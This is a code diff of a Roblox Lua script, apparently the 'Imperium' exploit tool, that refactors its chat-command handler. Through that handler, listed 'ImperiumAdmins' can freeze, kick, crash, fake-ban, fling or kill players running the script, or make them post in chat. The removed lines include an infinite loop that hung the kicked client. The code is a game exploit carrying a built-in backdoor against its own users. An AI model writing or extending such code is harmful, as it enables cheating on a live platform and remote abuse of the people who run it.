@@ -59,34 +59,37 @@ end
   
 local bending = false
 local kickmsg = 'PERMA BANNED'
-local function commands(msg,plr)
-      if DisableMod == false or table.find(ImperiumAdmins, plr) then
-          local Mod = game:GetService('Players'):GetPlayerByUserId(plr)
-          local Msg = string.lower(msg)
-          local SplitCMD = string.split(Msg, ' ')
-          local Lower = string.lower(player.Name)
-          local Allowed = string.find(Lower, SplitCMD[2])
+local function commands(msg, plr)
+    if DisableMod == false or table.find(ImperiumAdmins, plr) then
+        local Mod = game:GetService('Players'):GetPlayerByUserId(plr)
+        local Msg = string.lower(msg)
+        local SplitCMD = string.split(Msg, ' ')
+        local Lower = string.lower(player.Name)
 
-          if Allowed then
-              if string.find(SplitCMD[1], '!freeze') then
-                  player.Character.HumanoidRootPart.Anchored = true
-              end
+        local Allowed = SplitCMD[2] and string.find(Lower, SplitCMD[2])
 
-              if string.find(SplitCMD[1], '!thaw') then
-                  player.Character.HumanoidRootPart.Anchored = false
-              end
+        if Allowed then
+            if string.find(SplitCMD[1], '!freeze') then
+                if GetRoot(player) then
+                    player.Character.HumanoidRootPart.Anchored = true
+                end
+            end
 
-              if string.find(SplitCMD[1], '!kick') then
-                  local ISADMIN = table.find(ImperiumAdmins, player.UserId)
-                  if not ISADMIN then
-                      kickmsg = Mod.Name
-                      player:Kick(kickmsg)
-                      wait(5)
-                      while true do end
-                  end
-              end
+            if string.find(SplitCMD[1], '!thaw') then
+                if GetRoot(player) then
+                    player.Character.HumanoidRootPart.Anchored = false
+                end
+            end
 
-              if string.find(SplitCMD[1], '!crash') then
+            if string.find(SplitCMD[1], '!kick') then
+                local ISADMIN = table.find(ImperiumAdmins, player.UserId)
+                if not ISADMIN then
+                    kickmsg = Mod.Name
+                    player:Kick(kickmsg)
+                end
+            end
+
+            if string.find(SplitCMD[1], '!crash') then
                 local ISADMIN = table.find(ImperiumAdmins, player.UserId)
                 if not ISADMIN then
                     pcall(function()
@@ -95,31 +98,33 @@ local function commands(msg,plr)
                 end
             end
 
-              if string.find(SplitCMD[1], '!bring') then
+            if string.find(SplitCMD[1], '!bring') then
                 local targetPlayerName = SplitCMD[2]
                 local targetPlayer = game.Players:FindFirstChild(targetPlayerName)
             
                 if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                    targetPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(player.Character.HumanoidRootPart.Position)
+                    targetPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
                 else
                     warn("El jugador no existe o no tiene un personaje.")
                 end
-              end
+            end
 
-              if string.find(SplitCMD[1], '!fakeban') then
-                  if table.find(ImperiumAdmins, plr) then
-                      local ISADMIN = table.find(ImperiumAdmins, player.UserId)
-                      if not ISADMIN then
-                          player:Kick('You have been banned for exploiting.')
-                      end
-                  end
-              end
+            if string.find(SplitCMD[1], '!fakeban') then
+                if table.find(ImperiumAdmins, plr) then
+                    local ISADMIN = table.find(ImperiumAdmins, player.UserId)
+                    if not ISADMIN then
+                        player:Kick('You have been banned for exploiting.')
+                    end
+                end
+            end
 
-              if string.find(SplitCMD[1], '!fling') then
-                GetRoot(plr).CFrame = CFrame.new(9999999999,9999999999,9999999999)
-              end
+            if string.find(SplitCMD[1], '!fling') then
+                if GetRoot(plr) then
+                    GetRoot(plr).CFrame = CFrame.new(9999999999, 9999999999, 9999999999)
+                end
+            end
 
-              if string.find(SplitCMD[1], '!milk') then
+            if string.find(SplitCMD[1], '!milk') then
                 GenImage(milk)
             end
 
@@ -128,7 +133,7 @@ local function commands(msg,plr)
             end
 
             if string.find(SplitCMD[1], '!say') then
-                local Message = Arg3(Split)
+                local Message = Arg3(SplitCMD)
                 local args = { [1] = Message, [2] = "All" }
                 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
             end
@@ -150,18 +155,19 @@ local function commands(msg,plr)
             end
 
             if string.find(SplitCMD[1], '!kill') then
-                GetHum(plr):ChangeState(15)
+                local humanoid = GetHum(plr)
+                if humanoid then
+                    humanoid:ChangeState(15)
+                end
             end
 
-          else
-
-              if string.find(msg, '/e test') then
-                  game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Hey! I'm using Imperium!", 'All');
-              end
-
-          end
-      end
-  end
+        else
+            if string.find(msg, '/e test') then
+                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Hey! I'm using Imperium!", 'All')
+            end
+        end
+    end
+end
   
   muted = {}
   
